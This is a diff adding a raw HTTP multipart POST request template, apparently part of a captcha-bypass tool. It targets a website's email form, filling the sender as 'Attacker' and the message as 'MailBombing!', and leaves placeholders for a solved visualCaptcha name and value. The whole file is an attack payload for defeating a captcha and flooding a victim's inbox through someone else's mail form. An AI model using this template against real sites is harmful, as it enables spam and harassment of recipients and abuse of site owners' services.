@@ -1,0 +1,35 @@
+POST /target HTTP/1.1
+Host: domain.tld
+User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0
+Accept: application/json, text/javascript, */*; q=0.01
+Accept-Language: fr,fr-FR;q=0.8,en-US;q=0.5,en;q=0.3
+Accept-Encoding: gzip, deflate
+X-Requested-With: XMLHttpRequest
+Referer: http://domain.tld/page_with_visualcaptcha.html
+Content-Length: 927
+Content-Type: multipart/form-data; boundary=---------------------------31337313371337
+Cookie: PHPSESSIOND=MySeSsIoNIdCuStOm
+Connection: close
+
+-----------------------------31337313371337
+Content-Disposition: form-data; name="targetsEmails"
+
+target@target.com
+-----------------------------31337313371337
+Content-Disposition: form-data; name="senderName"
+
+Attacker
+-----------------------------31337313371337
+Content-Disposition: form-data; name="senderEmail"
+
+attacker@attacker.com
+-----------------------------31337313371337
+Content-Disposition: form-data; name="message"
+
+MailBombing!
+-----------------------------31337313371337
+Content-Disposition: form-data; name="%VISUALCAPTCHANAME%"
+
+%VISUALCAPTCHAVALUE%
+-----------------------------31337313371337--
+
